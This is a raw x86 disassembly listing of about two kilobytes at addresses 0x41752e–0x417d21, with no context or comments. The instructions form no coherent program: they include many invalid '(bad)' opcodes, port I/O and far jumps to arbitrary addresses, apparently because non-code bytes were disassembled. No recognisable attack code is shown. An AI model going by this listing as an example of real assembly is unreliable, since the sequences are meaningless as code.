  41752e:	xor    DWORD PTR [ecx],esi
  417530:	adc    BYTE PTR [edx+0xddfa548],0x42
  417537:	test   eax,0xb2aa7440
  41753c:	mov    ebp,0xc95776e8
  417541:	je     0x417577
  417543:	hlt    
  417544:	hlt    
  417545:	int3   
  417546:	adc    al,0x6
  417548:	ret    
  417549:	mov    esp,0x5e592b60
  41754e:	inc    ebx
  41754f:	jmp    0xb092:0x4f92338b
  417556:	sbb    dl,BYTE PTR [edx]
  417558:	repnz lods eax,DWORD PTR ds:[esi]
  41755a:	sub    esi,DWORD PTR [esi+0x26499609]
  417560:	sbb    dh,BYTE PTR [eax+0x4e]
  417563:	fistp  QWORD PTR [ebx+ecx*2-0x18]
  417567:	in     eax,0xf3
  417569:	repz fucomip st,st(7)
  41756c:	out    0x70,eax
  41756e:	cdq    
  41756f:	inc    edx
  417570:	pop    ebp
  417571:	xchg   ecx,eax
  417572:	daa    
  417573:	mov    DWORD PTR ds:0x5c15ec72,ecx
  417579:	dec    edx
  41757a:	je     0x417542
  41757c:	adc    BYTE PTR ds:0xfcfe518f,cl
  417582:	mov    ebx,0xe838960c
  417587:	and    DWORD PTR [ebp+0x53],ebx
  41758a:	inc    esp
  41758b:	push   esi
  41758c:	xchg   esp,eax
  41758d:	imul   edx,ebp,0xf5936371
  417593:	mov    BYTE PTR [ecx-0x15],0x78
  417597:	fadd   st(0),st
  417599:	push   ebx
  41759a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41759b:	outs   dx,DWORD PTR ds:[esi]
  41759c:	sub    edx,DWORD PTR [ecx]
  41759e:	mov    eax,ds:0xc87c94f4
  4175a3:	mov    dh,BYTE PTR [ebp-0x71]
  4175a6:	js     0x4175ba
  4175a8:	or     eax,0xf3ef0abd
  4175ad:	pop    ecx
  4175ae:	xor    esp,edx
  4175b0:	ret    0x3b45
  4175b3:	ja     0x4175c8
  4175b5:	dec    ebp
  4175b6:	es dec ebx
  4175b8:	pop    esi
  4175b9:	xchg   ecx,eax
  4175ba:	repz sub eax,0x542e2018
  4175c0:	nop
  4175c1:	sub    bh,BYTE PTR ds:0x8c390b87
  4175c7:	dec    ebp
  4175c8:	mov    ebx,0xc1a6e588
  4175cd:	mov    al,ds:0xd38d2b7b
  4175d2:	cmp    DWORD PTR [edi+0x138ec3e0],0xe651c0d6
  4175dc:	cmp    BYTE PTR [edi+edi*4],bh
  4175df:	test   al,0x66
  4175e1:	adc    ebp,DWORD PTR [edi+ebp*1-0x462ec046]
  4175e8:	sub    eax,0x122a80e3
  4175ed:	int3   
  4175ee:	mov    ebx,0x76260566
  4175f3:	call   0xecd:0x7015b44f
  4175fa:	aad    0xb6
  4175fc:	xor    eax,0x10922061
  417601:	clc    
  417602:	out    0x8,al
  417604:	xchg   ecx,eax
  417605:	aad    0x59
  417607:	xchg   DWORD PTR [edi+0x28],edi
  41760a:	(bad)  
  41760b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41760c:	push   ebx
  41760d:	daa    
  41760e:	xchg   edx,eax
  41760f:	ss lock and eax,0xaed4310
  417616:	jnp    0x4175e5
  417618:	fnstcw WORD PTR [esi]
  41761a:	imul   esp,DWORD PTR [eax+0x2f],0xffffffe3
  41761e:	cmc    
  41761f:	dec    DWORD PTR [edi-0x66]
  417622:	pushf  
  417623:	enter  0x649d,0x14
  417627:	aam    0x52
  417629:	or     bl,BYTE PTR es:[edx+eax*4]
  41762d:	mov    ecx,0xe96dca21
  417632:	mov    esp,0xc054e540
  417637:	jl     0x4176a9
  417639:	pop    ecx
  41763a:	push   esi
  41763b:	add    edi,ebp
  41763d:	xor    al,0xb2
  41763f:	sar    bl,cl
  417641:	dec    ecx
  417642:	retf   
  417643:	xchg   dl,bl
  417645:	loope  0x4176b1
  417647:	inc    ebp
  417648:	out    dx,al
  417649:	jno    0x417686
  41764b:	icebp  
  41764c:	sbb    bh,BYTE PTR [edx-0x10]
  41764f:	pushf  
  417650:	jmp    0x634e4c24
  417655:	dec    edx
  417656:	bound  esp,QWORD PTR [eax]
  417658:	ficomp WORD PTR [ecx+ecx*1+0x10b59aba]
  41765f:	into   
  417660:	pop    eax
  417661:	sub    esp,edi
  417663:	sbb    al,0xfd
  417665:	retf   0xedce
  417668:	dec    edi
  417669:	xchg   ebx,eax
  41766a:	ds sbb ebx,edi
  41766d:	(bad)  
  41766e:	pushf  
  41766f:	mov    dh,0x4d
  417671:	dec    ecx
  417672:	and    DWORD PTR [edi-0x80],eax
  417675:	ins    BYTE PTR es:[edi],dx
  417676:	xchg   BYTE PTR [edx-0x45],ch
  417679:	ret    
  41767a:	xchg   ebp,eax
  41767b:	in     al,dx
  41767c:	sbb    BYTE PTR [edi],ah
  41767e:	sbb    BYTE PTR [edx-0x47],bh
  417681:	mov    WORD PTR [esi-0x30be80e8],gs
  417687:	inc    ecx
  417688:	repnz or eax,0x1eb789cc
  41768e:	jge    0x417674
  417690:	and    al,0xb9
  417692:	into   
  417693:	scas   eax,DWORD PTR es:[edi]
  417694:	mov    ds:0x91d2bb4e,al
  417699:	in     al,0x9
  41769b:	nop
  41769c:	sbb    al,0x84
  41769e:	iret   
  41769f:	repz call FWORD PTR [ebx+edi*2]
  4176a3:	lds    eax,FWORD PTR [ecx-0x11fc2519]
  4176a9:	and    dl,BYTE PTR [esi+0x2e5dcc72]
  4176af:	mov    WORD PTR [edx-0x1c85d211],es
  4176b5:	jbe    0x417669
  4176b7:	loop   0x41768d
  4176b9:	iret   
  4176ba:	dec    edx
  4176bb:	inc    ebx
  4176bc:	in     eax,0xe3
  4176be:	sbb    dl,0xce
  4176c1:	mov    esi,0xa50c75e9
  4176c6:	inc    ebp
  4176c7:	push   ebp
  4176c8:	mov    dh,0x16
  4176ca:	adc    eax,0x779fbbde
  4176cf:	cs (bad) 
  4176d1:	shl    al,0xbc
  4176d4:	mov    ds:0x7815d9b3,al
  4176d9:	test   al,0xfc
  4176db:	in     al,dx
  4176dc:	scas   al,BYTE PTR es:[edi]
  4176dd:	mov    bh,0x89
  4176df:	push   ss
  4176e0:	data16 or bh,al
  4176e3:	lahf   
  4176e4:	in     eax,dx
  4176e5:	retf   
  4176e6:	and    al,0xf8
  4176e8:	test   ah,bl
  4176ea:	rcr    DWORD PTR [ebp-0x4c59ca06],1
  4176f0:	sub    esp,DWORD PTR [ecx-0x44]
  4176f3:	mov    bh,0x65
  4176f5:	dec    ebp
  4176f6:	scas   al,BYTE PTR es:[edi]
  4176f7:	jne    0x4176b9
  4176f9:	inc    ecx
  4176fa:	mov    WORD PTR [edi-0x572cf6af],es
  417700:	(bad)  
  417701:	fnstcw WORD PTR [ecx]
  417703:	imul   ebp,edx,0xdffa05a6
  417709:	or     eax,0x64662083
  41770e:	fs pop esi
  417710:	hlt    
  417711:	dec    esp
  417712:	sbb    bl,bl
  417714:	sbb    DWORD PTR [edi+ecx*8+0x2],ebp
  417718:	mul    DWORD PTR [eax]
  41771a:	mov    cl,0xff
  41771c:	jns    0x4176a8
  41771e:	rcl    BYTE PTR [ecx-0x99cdd66],1
  417724:	and    al,0x95
  417726:	sahf   
  417727:	jmp    0x2783:0x9b34bf82
  41772e:	add    esp,ebx
  417730:	stos   DWORD PTR es:[edi],eax
  417731:	xor    al,0xb3
  417733:	ja     0x41777b
  417735:	ficom  DWORD PTR [eax-0x74b4e974]
  41773b:	out    0x0,eax
  41773d:	inc    eax
  41773e:	sar    DWORD PTR [ebp+0x6b555e10],1
  417744:	leave  
  417745:	sbb    DWORD PTR [edx-0x4225cf1c],edx
  41774b:	or     ch,BYTE PTR [ebx]
  41774d:	arpl   WORD PTR [eax+eax*2+0x15],bx
  417751:	sahf   
  417752:	adc    eax,DWORD PTR [eax]
  417754:	fldenv [ebp-0x20]
  417757:	and    eax,0xcc86e636
  41775c:	mov    edx,0xddd5d2f5
  417761:	mov    edx,0x3135ffa1
  417766:	test   BYTE PTR [ecx-0xb],cl
  417769:	push   edi
  41776a:	jle    0x4177e6
  41776c:	cmp    bl,bh
  41776e:	imul   esi,edi,0xe54897cf
  417774:	(bad)
  417778:	push   edi
  417779:	cmp    dh,BYTE PTR [ebp-0x24]
  41777c:	xor    dl,BYTE PTR [ecx+0x69da2ce5]
  417782:	push   edi
  417783:	and    eax,DWORD PTR [esi+0x21]
  417786:	push   eax
  417787:	ficomp DWORD PTR [edx]
  417789:	int3   
  41778a:	loope  0x41776d
  41778c:	dec    BYTE PTR [ecx-0x77091e96]
  417792:	sahf   
  417793:	jnp    0x417771
  417795:	bound  edi,QWORD PTR [eax-0x7f]
  417798:	pop    ebx
  417799:	inc    ecx
  41779a:	cmc    
  41779b:	mov    edi,0x8f0b0f01
  4177a0:	stos   BYTE PTR es:[edi],al
  4177a1:	mov    es,WORD PTR [eax+0x2d]
  4177a4:	loope  0x4177b1
  4177a6:	cmp    ch,ah
  4177a8:	out    dx,eax
  4177a9:	imul   edi,esp,0x835a06
  4177af:	or     BYTE PTR [esi+esi*8],dl
  4177b2:	bound  ecx,QWORD PTR [ebp-0x49b01542]
  4177b8:	or     BYTE PTR [ebx+0x72],dl
  4177bb:	pop    ss
  4177bc:	sahf   
  4177bd:	ins    BYTE PTR es:[edi],dx
  4177be:	xchg   ebx,eax
  4177bf:	mov    ch,BYTE PTR [eax-0x5e]
  4177c2:	rol    DWORD PTR [edi+ebp*1],1
  4177c5:	or     ch,BYTE PTR ds:0x1fcb019
  4177cb:	and    bl,BYTE PTR [esi+esi*1+0x71]
  4177cf:	aaa    
  4177d0:	out    0xf,al
  4177d2:	aas    
  4177d3:	repz sub eax,0xbc968f07
  4177d9:	call   0x4c598108
  4177de:	mov    edi,0x754bece2
  4177e3:	bound  ebx,QWORD PTR [ebp+0x260c76dc]
  4177e9:	test   BYTE PTR ds:0x34db8e87,dl
  4177ef:	jb     0x41785b
  4177f1:	arpl   WORD PTR [edx-0x3a],ax
  4177f4:	jmp    FWORD PTR [eax+0x650e146]
  4177fa:	pop    ecx
  4177fb:	bound  edx,QWORD PTR [edx-0x66b7f784]
  417801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417802:	inc    DWORD PTR [edx+0x51664291]
  417808:	push   edx
  417809:	cli    
  41780a:	sahf   
  41780b:	sbb    eax,0x8cd19bc6
  417810:	push   edi
  417811:	call   DWORD PTR ds:0xe0cfaf77
  417817:	popf   
  417818:	cmp    esi,edx
  41781a:	adc    al,0xd8
  41781c:	aam    0x42
  41781e:	cmc    
  41781f:	pop    ebx
  417820:	mov    dl,0x9e
  417822:	and    cl,BYTE PTR [ebx+eiz*1]
  417825:	adc    bl,BYTE PTR [edi-0x69e4ed36]
  41782b:	mov    cl,0x97
  41782d:	mov    DWORD PTR [esi-0x42822d00],esp
  417833:	sub    ebp,esi
  417835:	xor    eax,0x5f224fbd
  41783a:	or     bl,BYTE PTR [ecx+0x34]
  41783d:	dec    edi
  41783e:	repz rcl BYTE PTR [edi-0x6f],cl
  417842:	mov    dl,0xe4
  417844:	cmp    dl,BYTE PTR [eax+eiz*1-0x63]
  417848:	xchg   edx,eax
  417849:	mov    edx,0xf5dc4704
  41784e:	sub    BYTE PTR [edi+0x31e49a8],ch
  417854:	or     edi,ebx
  417856:	shl    BYTE PTR [edx+edi*8+0x42428194],1
  41785d:	out    dx,eax
  41785e:	xchg   esi,eax
  41785f:	mov    ebp,0x6ca8a870
  417864:	(bad)  
  417865:	fidiv  WORD PTR [esi+0x20]
  417868:	or     BYTE PTR [ecx],al
  41786a:	sub    BYTE PTR [eax-0x28],dl
  41786d:	dec    ebx
  41786e:	push   cs
  41786f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417870:	or     DWORD PTR [ebx],0xffffffa4
  417873:	fisub  DWORD PTR [ecx+0x3f]
  417876:	mov    bl,0xb9
  417878:	rcl    BYTE PTR [ebp-0x5b],1
  41787b:	or     DWORD PTR [ecx],esp
  41787d:	mov    fs,eax
  41787f:	in     al,0x6d
  417881:	or     al,0xaf
  417883:	jbe    0x4178f5
  417885:	dec    ecx
  417886:	jmp    0x6a1e:0x461fa26
  41788d:	jp     0x4178c4
  41788f:	out    0xdd,al
  417891:	out    0x3e,al
  417893:	enter  0x6fd4,0xc2
  417897:	arpl   WORD PTR [esi+0x6473ec7],ax
  41789d:	(bad)  
  41789e:	out    dx,al
  41789f:	loope  0x417889
  4178a1:	sbb    edi,DWORD PTR [ecx]
  4178a3:	enter  0xb533,0xc1
  4178a7:	dec    edx
  4178a8:	add    dh,bh
  4178aa:	mov    bl,0x7a
  4178ac:	dec    edx
  4178ad:	adc    eax,0x24281d5b
  4178b2:	mov    ds:0x5643fce2,eax
  4178b7:	push   cs
  4178b8:	out    dx,eax
  4178b9:	or     esp,eax
  4178bb:	push   edx
  4178bc:	fisubr DWORD PTR [edi]
  4178be:	sbb    edx,DWORD PTR [ebx]
  4178c0:	bnd jno 0x4178e3
  4178c3:	dec    DWORD PTR [esi+eax*8+0x30142f93]
  4178ca:	loop   0x41794a
  4178cc:	inc    ebp
  4178cd:	in     al,dx
  4178ce:	mov    WORD PTR [ebx+ebp*2],ds
  4178d1:	jge    0x417884
  4178d3:	or     BYTE PTR [ebp+esi*4+0x7287ba85],ch
  4178da:	lods   eax,DWORD PTR ds:[esi]
  4178db:	mov    ss,WORD PTR [esp+eiz*2-0x4a71c462]
  4178e2:	add    al,0x62
  4178e4:	pushf  
  4178e5:	and    al,0x8c
  4178e7:	fbld   TBYTE PTR [edx]
  4178e9:	push   cs
  4178ea:	aad    0x20
  4178ec:	mov    ebp,0x75e20be9
  4178f1:	jnp    0x417910
  4178f3:	jl     0x4178cf
  4178f5:	push   ecx
  4178f6:	(bad)  [esi-0x6d]
  4178f9:	jmp    0x41788a
  4178fb:	inc    ebp
  4178fc:	fdivr  QWORD PTR [ebx]
  4178fe:	int3   
  4178ff:	pop    esp
  417900:	jns    0x41795d
  417902:	jb     0x4178fe
  417904:	lock addr16 mov dh,0x21
  417908:	add    DWORD PTR [ebp-0x3],0x3c18bd7b
  41790f:	pop    ecx
  417910:	pop    esp
  417911:	mov    dl,0xf3
  417913:	mov    bl,0x34
  417915:	push   esi
  417916:	je     0x417939
  417918:	inc    edi
  417919:	sbb    ch,dh
  41791b:	add    eax,0x8960944c
  417920:	das    
  417921:	inc    esi
  417922:	mov    ?,WORD PTR [esi]
  417924:	sahf   
  417925:	loop   0x4178e4
  417927:	scas   eax,DWORD PTR es:[edi]
  417928:	xor    eax,0xf13ec8e5
  41792d:	sar    eax,cl
  41792f:	sub    bh,dl
  417931:	mov    bh,0xb7
  417933:	in     al,dx
  417934:	mov    bl,0x72
  417936:	dec    edx
  417937:	add    cl,0x2f
  41793a:	and    cl,0x33
  41793d:	pop    edi
  41793e:	test   BYTE PTR [eax-0x3b3aaf5a],ch
  417944:	std    
  417945:	cmp    BYTE PTR [esi-0x2e1f1ae0],0xc4
  41794c:	out    dx,eax
  41794d:	pushf  
  41794e:	adc    DWORD PTR ds:0xb54da3b7,0x144061e6
  417958:	mov    dl,0x3c
  41795a:	mov    gs,WORD PTR [edi]
  41795c:	sbb    bh,ch
  41795e:	xchg   ch,dl
  417960:	test   BYTE PTR ds:0x6137a2e6,cl
  417966:	mov    ebp,0x18e5a352
  41796b:	iret   
  41796c:	loope  0x417946
  41796e:	int    0x28
  417970:	or     al,0x49
  417972:	fs out dx,eax
  417974:	inc    ebp
  417975:	pop    ebx
  417976:	and    DWORD PTR [edx],esp
  417978:	inc    edx
  417979:	inc    ecx
  41797a:	mov    ebx,DWORD PTR [esi+0x20264779]
  417980:	add    al,0xfd
  417982:	pop    ss
  417983:	call   0xda494079
  417988:	push   0x5116bcc
  41798d:	push   es
  41798e:	scas   eax,DWORD PTR es:[edi]
  41798f:	fsubp  st(1),st
  417991:	dec    ebx
  417992:	dec    edi
  417993:	out    dx,eax
  417994:	or     al,0x67
  417996:	push   ss
  417997:	push   ebx
  417998:	mov    cl,0x16
  41799a:	pop    eax
  41799b:	jo     0x417991
  41799d:	mov    bh,BYTE PTR [edi]
  41799f:	aas    
  4179a0:	jmp    0x417928
  4179a2:	sbb    al,0x44
  4179a4:	fwait
  4179a5:	into   
  4179a6:	push   cs
  4179a7:	cdq    
  4179a8:	sub    ch,ah
  4179aa:	je     0x4179f0
  4179ac:	and    BYTE PTR [ebx],al
  4179ae:	cmp    BYTE PTR [eax],bh
  4179b0:	mov    ebx,0xd5931521
  4179b5:	cmp    edi,DWORD PTR [edi]
  4179b7:	neg    BYTE PTR [esi]
  4179b9:	es ins BYTE PTR es:[edi],dx
  4179bb:	inc    edx
  4179bc:	mov    bl,0x1e
  4179be:	adc    cl,BYTE PTR [ecx-0x15107ae0]
  4179c4:	or     cl,ch
  4179c6:	push   edi
  4179c7:	cli    
  4179c8:	add    BYTE PTR [edi*1-0x63a629b6],0x26
  4179d0:	nop
  4179d1:	das    
  4179d2:	pop    ebx
  4179d3:	jp     0x417a25
  4179d5:	inc    ebx
  4179d6:	cmp    esi,DWORD PTR [eax+0x2d]
  4179d9:	or     eax,0xa733fde4
  4179de:	fucom  st(6)
  4179e0:	fs cmp eax,0x7eb78775
  4179e6:	mov    BYTE PTR [esi+0x59bcd924],0xa1
  4179ed:	(bad)
  4179f0:	sbb    al,dh
  4179f2:	dec    edx
  4179f3:	jns    0x417a15
  4179f5:	xor    dh,dl
  4179f7:	pop    esp
  4179f8:	into   
  4179f9:	fidivr WORD PTR [eax+esi*4-0x4b]
  4179fd:	mov    bh,0xbc
  4179ff:	mul    BYTE PTR [edx+0x798e31b8]
  417a05:	aas    
  417a06:	ja     0x4179ea
  417a08:	in     eax,dx
  417a09:	enter  0xd05a,0x76
  417a0d:	push   edi
  417a0e:	dec    ebp
  417a0f:	mov    DWORD PTR [esi],0x984280a5
  417a15:	nop
  417a16:	inc    eax
  417a17:	inc    eax
  417a18:	fwait
  417a19:	pop    es
  417a1a:	into   
  417a1b:	jge    0x417a62
  417a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a1e:	push   edx
  417a1f:	popa   
  417a20:	mov    ebp,0x55f3a22e
  417a25:	int3   
  417a26:	xchg   BYTE PTR [edx+0x75],dh
  417a29:	xchg   ebp,eax
  417a2a:	and    cl,dl
  417a2c:	das    
  417a2d:	or     eax,0x7b3d2748
  417a32:	(bad)  
  417a33:	lds    edx,FWORD PTR [esi-0x2f]
  417a36:	push   ebx
  417a37:	xchg   DWORD PTR [ecx+ebx*2],edi
  417a3a:	int    0xc8
  417a3c:	(bad)  
  417a3d:	sub    dl,BYTE PTR [edi+0x4c]
  417a40:	adc    eax,0x21215f0a
  417a45:	or     BYTE PTR [edi+0x60],bl
  417a48:	aad    0xc8
  417a4a:	jge    0x417ac6
  417a4c:	cs cld 
  417a4e:	outs   dx,DWORD PTR ds:[esi]
  417a4f:	je     0x417a40
  417a51:	pop    esp
  417a52:	jecxz  0x417a3e
  417a54:	mov    esp,0x5e9e2b
  417a59:	fisttp QWORD PTR [eax+0xa64cc95]
  417a5f:	mov    ebp,0xa9f6b093
  417a64:	or     ah,BYTE PTR [ecx-0x4e70ed64]
  417a6a:	cdq    
  417a6b:	je     0x417ac4
  417a6d:	(bad)  [ecx+eiz*1+0x59]
  417a71:	ficom  WORD PTR [edx-0x8bc58b4]
  417a77:	mov    edx,0xf8f2bc
  417a7c:	fild   DWORD PTR [eax]
  417a7e:	neg    edi
  417a80:	push   esp
  417a81:	jne    0x417a65
  417a83:	xor    eax,0x7fb59ea5
  417a88:	dec    esp
  417a89:	push   es
  417a8a:	pushf  
  417a8b:	add    ebx,0x2b
  417a8e:	jecxz  0x417a65
  417a90:	fwait
  417a91:	pop    esp
  417a92:	test   al,0x85
  417a94:	test   BYTE PTR [edx+edi*4],0xb
  417a98:	test   ebp,ebx
  417a9a:	daa    
  417a9b:	xchg   esp,edx
  417a9d:	inc    ecx
  417a9e:	call   0x332c60a7
  417aa3:	stos   DWORD PTR es:[edi],eax
  417aa4:	sbb    esi,DWORD PTR [ebx-0x63]
  417aa7:	pop    ecx
  417aa8:	pop    edi
  417aa9:	pop    ebx
  417aaa:	pop    ebx
  417aab:	mov    ebp,0x9b215d77
  417ab0:	mov    al,ds:0xb52775c6
  417ab5:	loope  0x417ace
  417ab7:	hlt    
  417ab8:	jnp    0x417a48
  417aba:	jmp    0xd9a8252a
  417abf:	push   edx
  417ac0:	sbb    al,0x5f
  417ac2:	les    eax,FWORD PTR [eax-0x5c0feb91]
  417ac8:	in     al,dx
  417ac9:	es push ebp
  417acb:	push   es
  417acc:	ins    BYTE PTR es:[edi],dx
  417acd:	bound  esi,QWORD PTR [eax+0x3d]
  417ad0:	mov    bh,0x9a
  417ad2:	call   0xed6417bd
  417ad7:	pop    ds
  417ad8:	xchg   ebx,eax
  417ad9:	daa    
  417ada:	fiadd  DWORD PTR [ecx+0x3a]
  417add:	and    al,0x65
  417adf:	(bad)  
  417ae0:	mov    al,ds:0x239f4b1f
  417ae5:	cmp    eax,0x10cd39da
  417aea:	je     0x417b37
  417aec:	mov    dh,0xc7
  417aee:	xor    dh,BYTE PTR [edx+0x1e]
  417af1:	fwait
  417af2:	es inc esp
  417af4:	xor    bh,BYTE PTR [ecx+0x73]
  417af7:	out    dx,eax
  417af8:	push   cs
  417af9:	(bad)  
  417afa:	jnp    0x417b1e
  417afc:	aam    0x3
  417afe:	out    dx,al
  417aff:	mov    bl,0x47
  417b01:	or     edx,esi
  417b03:	or     ebp,DWORD PTR [ebp+0x34]
  417b06:	mov    ah,0x1d
  417b08:	bnd jo 0x417b2f
  417b0b:	cmc    
  417b0c:	mov    edi,DWORD PTR [edx+ebp*4+0xe8452cb]
  417b13:	popf   
  417b14:	das    
  417b15:	in     al,0x2b
  417b17:	jnp    0x417b2a
  417b19:	fbstp  TBYTE PTR [ebx+ebx*2]
  417b1c:	(bad)  
  417b1d:	jb     0x417b53
  417b1f:	fcom   QWORD PTR [ebx-0x27a252ef]
  417b25:	push   es
  417b26:	mov    ecx,0x4a4e3c12
  417b2b:	push   ds
  417b2c:	(bad)  
  417b2d:	jae    0x417ae2
  417b2f:	es repnz mov esp,0xb2f9130
  417b36:	jnp    0x417ad6
  417b38:	test   BYTE PTR [eax-0x79],0xfc
  417b3c:	(bad)  
  417b3d:	into   
  417b3e:	repnz sti 
  417b40:	pop    es
  417b41:	(bad)  
  417b42:	in     eax,0xd1
  417b44:	mov    ds:0x76db1265,al
  417b49:	fdiv   DWORD PTR [edx]
  417b4b:	push   esp
  417b4c:	adc    al,bl
  417b4e:	add    ebp,0xed1049d8
  417b54:	pop    es
  417b55:	mov    ds:0x5a22f3cb,al
  417b5a:	pop    edx
  417b5b:	push   ds
  417b5c:	cli    
  417b5d:	stos   BYTE PTR es:[edi],al
  417b5e:	in     al,0x58
  417b60:	dec    ecx
  417b61:	ja     0x417b81
  417b63:	mov    esi,0xbc2c7995
  417b68:	push   ss
  417b69:	jge    0x417bde
  417b6b:	ss inc esi
  417b6d:	pop    ecx
  417b6e:	and    DWORD PTR [edi-0x6],edx
  417b71:	fisttp DWORD PTR [eax+0x36]
  417b74:	cmp    eax,0x600fd766
  417b79:	outs   dx,DWORD PTR ds:[esi]
  417b7a:	sbb    dh,ah
  417b7c:	jg     0x417bea
  417b7e:	pop    esi
  417b7f:	cli    
  417b80:	xchg   edx,eax
  417b81:	inc    edx
  417b82:	xor    ecx,DWORD PTR [edi]
  417b84:	or     dh,ch
  417b86:	push   ss
  417b87:	push   ebx
  417b88:	cmp    ebp,DWORD PTR [ebp-0x10]
  417b8b:	in     eax,dx
  417b8c:	mov    ebp,0xcd85022b
  417b91:	add    eax,0x32d41a37
  417b96:	lods   eax,DWORD PTR ds:[esi]
  417b97:	ficom  DWORD PTR [ebp-0x17]
  417b9a:	stos   DWORD PTR es:[edi],eax
  417b9b:	push   ds
  417b9c:	ins    BYTE PTR es:[edi],dx
  417b9d:	mov    ecx,ebx
  417b9f:	aas    
  417ba0:	push   0xf84e2a99
  417ba5:	not    DWORD PTR [ebp-0x67]
  417ba8:	fsubr  DWORD PTR [ebp-0x5305d1a]
  417bae:	jl     0x417bb1
  417bb0:	add    BYTE PTR [ebx+ebx*1],bl
  417bb3:	lds    eax,FWORD PTR [edi+0x22]
  417bb6:	and    BYTE PTR [ebx+0x5e38cfa0],ch
  417bbc:	imul   eax,DWORD PTR [eax],0x4e
  417bbf:	cwde   
  417bc0:	and    al,0xd8
  417bc2:	mov    ebp,0x422ee46
  417bc7:	pusha  
  417bc8:	pop    es
  417bc9:	rcl    BYTE PTR [ebp+ecx*4-0x35],1
  417bcd:	call   0x10d6ca3e
  417bd2:	stos   BYTE PTR es:[edi],al
  417bd3:	inc    ebx
  417bd4:	push   esp
  417bd5:	into   
  417bd6:	loopne 0x417bf7
  417bd8:	adc    al,0x58
  417bda:	sti    
  417bdb:	jae    0x417b65
  417bdd:	std    
  417bde:	in     eax,0xab
  417be0:	add    eax,0x9f98980f
  417be5:	aas    
  417be6:	dec    edi
  417be7:	jns    0x417bdf
  417be9:	mov    bl,0x87
  417beb:	sub    eax,0xb3628c9b
  417bf0:	or     BYTE PTR [edx+0xf],ah
  417bf3:	cmp    bl,BYTE PTR [ebp+ebx*4-0x230ca9d]
  417bfa:	xor    bl,cl
  417bfc:	sbb    esp,DWORD PTR [esi-0x7c]
  417bff:	outs   dx,DWORD PTR ds:[esi]
  417c00:	or     al,0x39
  417c02:	sbb    al,0x29
  417c04:	dec    ebp
  417c05:	jno    0x417baf
  417c07:	call   0x3c93:0x2a98fba
  417c0e:	sbb    ah,bl
  417c10:	or     eax,DWORD PTR [ebx]
  417c12:	xlat   BYTE PTR ds:[ebx]
  417c13:	mov    esp,DWORD PTR ds:0xc7d13ef9
  417c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c1a:	icebp  
  417c1b:	pop    esp
  417c1c:	clc    
  417c1d:	cmp    DWORD PTR [edi-0x2f2848d8],0xca85cbbf
  417c27:	lea    edi,[ebx-0x47ef8929]
  417c2d:	in     eax,dx
  417c2e:	pop    ss
  417c2f:	jo     0x417c18
  417c31:	out    0x18,al
  417c33:	mov    al,0xb1
  417c35:	sahf   
  417c36:	cmp    BYTE PTR [edi+0x14b5eaa5],0x16
  417c3d:	sbb    eax,0xaf7a252d
  417c42:	push   ebp
  417c43:	pop    ecx
  417c44:	push   edi
  417c45:	ins    BYTE PTR es:[edi],dx
  417c46:	push   ds
  417c47:	xchg   ebx,eax
  417c48:	add    DWORD PTR [eax-0xd],edx
  417c4b:	fild   WORD PTR [edx+0x46333c48]
  417c51:	(bad)  
  417c52:	fstp   TBYTE PTR [edx+ebx*8+0x72]
  417c56:	lahf   
  417c57:	das    
  417c58:	call   0xb53a:0xa995814a
  417c5f:	int3   
  417c60:	cdq    
  417c61:	mov    esi,0x5b5604f3
  417c66:	cli    
  417c67:	outs   dx,BYTE PTR ds:[esi]
  417c68:	int3   
  417c69:	mov    ds:0x1dde1967,al
  417c6e:	mov    esp,0x2516df79
  417c73:	adc    eax,DWORD PTR [edi+0x3cf388ea]
  417c79:	dec    eax
  417c7a:	mov    DWORD PTR [eax],0xacc2ddb7
  417c80:	inc    ebx
  417c81:	mov    ebp,DWORD PTR [edi+0x4a]
  417c84:	sub    eax,0xae2de718
  417c89:	dec    esi
  417c8a:	inc    esp
  417c8b:	cli    
  417c8c:	jns    0x417c2b
  417c8e:	mov    ecx,0x96a6f103
  417c93:	xchg   ebx,eax
  417c94:	add    cl,0xd6
  417c97:	dec    esp
  417c98:	ins    DWORD PTR es:[edi],dx
  417c99:	sub    eax,0xb2d686a9
  417c9e:	not    ebp
  417ca0:	sub    ah,BYTE PTR [edi+0x72]
  417ca3:	jne    0x417c4f
  417ca5:	push   ebx
  417ca6:	icebp  
  417ca7:	das    
  417ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca9:	add    al,0x1a
  417cab:	cmp    ah,BYTE PTR [esi]
  417cad:	call   0x2e1615cf
  417cb2:	bound  eax,QWORD PTR [esp+eax*4]
  417cb5:	push   0x4340428e
  417cba:	es cld 
  417cbc:	and    dl,BYTE PTR [ecx]
  417cbe:	sub    al,0xdd
  417cc0:	imul   DWORD PTR [eax]
  417cc2:	retf   0x5da0
  417cc5:	lock rol BYTE PTR [eax-0x2aac921a],0x14
  417ccd:	mov    ah,0x72
  417ccf:	mov    bl,0xde
  417cd1:	leave  
  417cd2:	ss fs fwait
  417cd5:	dec    esi
  417cd6:	loopne 0x417d56
  417cd8:	xchg   ebx,eax
  417cd9:	mov    ds:0xbeaebd2b,eax
  417cde:	mov    BYTE PTR [edx+esi*4-0xb4c636f],ah
  417ce5:	inc    ecx
  417ce6:	arpl   dx,bx
  417ce8:	(bad)  
  417ce9:	mov    al,0xa
  417ceb:	int3   
  417cec:	aad    0xd7
  417cee:	pop    esi
  417cef:	push   0xffffff8b
  417cf1:	scas   al,BYTE PTR es:[edi]
  417cf2:	or     DWORD PTR [edx-0x19],esp
  417cf5:	mov    ds:0xe68903a2,al
  417cfa:	adc    eax,0xf6f3d72e
  417cff:	sub    DWORD PTR [ebx],esp
  417d01:	ja     0x417c8b
  417d03:	xor    DWORD PTR [esi],ecx
  417d05:	lods   eax,DWORD PTR ds:[esi]
  417d06:	es enter 0x43b1,0x11
  417d0b:	inc    esp
  417d0c:	xor    DWORD PTR [ebp-0x3b],edx
  417d0f:	pop    esi
  417d10:	fisubr DWORD PTR [ebp+ecx*2+0x6cab1ce2]
  417d17:	mov    bh,0xc7
  417d19:	xchg   ebp,eax
  417d1a:	or     bh,BYTE PTR [edx-0x1c]
  417d1d:	and    dh,dh
  417d1f:	xchg   eax,ebx
  417d21:	pop    eax
